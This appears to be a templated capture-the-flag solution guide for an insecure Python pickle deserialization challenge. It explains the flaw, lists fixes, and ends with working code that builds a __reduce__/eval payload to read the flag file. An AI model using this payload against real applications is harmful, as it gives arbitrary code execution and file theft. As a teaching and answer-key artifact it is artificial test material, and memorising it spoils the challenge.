Why This is Vulnerable

  • No integrity verification - The app accepts any pickle data without checking signatures or hashes.
  • Unsafe deserialization - Python's pickle can execute arbitrary code during deserialization.
  • Trust boundary violation - Untrusted user input is deserialized as if it came from a trusted source.
  • No input validation - No schema validation or whitelisting of allowed object types.

Attack Vector:

Craft a malicious pickle payload that reads {{ flag_path }} when deserialized. The pickle module allows arbitrary code execution via the __reduce__ method.

Fix:

  • Use safe serialization formats (JSON, YAML with safe_load)
  • Verify digital signatures before deserializing
  • Whitelist allowed object types
  • Use restricted unpicklers or sandboxed environments
  • Never deserialize untrusted data

Solution Steps

  1. Create a Python script to generate a malicious pickle payload that reads {{ flag_path }}
  2. The payload should use pickle's __reduce__ to execute open('{{ flag_path }}').read()
  3. Base64 encode the pickle payload
  4. Submit the base64-encoded payload to the form
  5. The deserialized output will contain the flag

Example Python code to generate payload:

import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('{{ flag_path }}').read()
        return (eval, ("open('{{ flag_path }}').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
